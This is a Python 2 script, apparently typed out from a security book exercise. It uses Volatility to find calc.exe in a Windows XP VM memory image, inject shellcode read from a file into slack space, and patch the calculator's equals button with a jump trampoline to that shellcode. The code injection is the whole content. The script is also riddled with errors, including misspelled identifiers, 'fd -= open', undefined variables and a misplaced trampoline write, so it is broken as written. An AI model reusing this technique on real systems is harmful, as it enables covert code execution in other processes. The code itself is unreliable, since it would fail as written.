import sys, struct, volatility.conf as conf, volatility.registry as registry
import volatility.commands as commands, volatility.addrspace as addrspace
import volatility.plugins.taskmods as taskmods

def banner():
	print "[***]   Code inject p158   [***]"
	print ""

#setup code
equals_button = 0x01005D51
memory_file = "WinXPSP2.vmem"
slack_space = None
trampoline_offset = None

sc_fd = open("cmeasure.bin", "rb")
sc = sc_fd.read()
sc_fd.close()
sys.path.append("/Users/justin/Downloads/volatility-2.3.1")
registry.PluginImporter()
config = conf.ConfObject()
registry.register_global_options(config, commands.Command)
registry.register_global_options(config, addrspace.BaseAddressSapce)
config.parse_otions()
config.PROFILE = "WinXPSP2x86"
config.LOCATION= "file://%s" % memory_file
#end setup code.  Probabaly better to put this in a function

p = taskmods.PSList(config)
for process in p.calculate():
	if str(process.ImageFileName) == "calc.exe":
		print "[*] Found calc.exe with PID %d" % process.UniqueProcessId
		print "[*] Hunting for physical offsets...please wait."
		address_space = process.get_process_address_space()
		pages = address_space.get_available_pages()
		for page in pages:
			physical = address_space.vtop(page[0])
			if physical is not None:
				if slack_space is None:
					fd = open(memory_file, "r+")
					fd.seek(physical)
					buf = fd.read(page[1])
					try:
						offset = buf.index("\x00" * len(sc))
						slack_space = page[0] + offset
						print "[*] Found good shellcode location!"
						print "[*] Virtual address: 0x%08x" % slack_space
						print "[*] Physical address: 0x%08x" % (physical+offset)
						print "[*] Injecting shellcode."
						fd.seek(physical+offset)
						fd.write(sc)
						fd.flush()
						tramp = "\xbb%s" % struct.pack("<L", page[0]+offset)
						tramp += "\xff\xe3"
						if trampoline_offsetis not None:
							break
					except:
						pass
					fd.close()
					if page[0] <= equals_button and equals_button < ((page[0]+page[1])-7):
						print "[*] Found our trampoline traget at: 0x%08x" % (physical)
						v_offset = equals_button - page[0]
						trampoline_offset = pysical + v_offset
						print "[*] Found our trampoline target at: 0x%08x" % (trampoline_offset)
						if slack_space is not None:
							break
				print "[*] Writing trampoline..."
				fd -= open(memory_file, "r+")
				fd.seek(trampoline_offset)
				df.write(tram)
				fd.close()
				print "[*] Done injecting code."
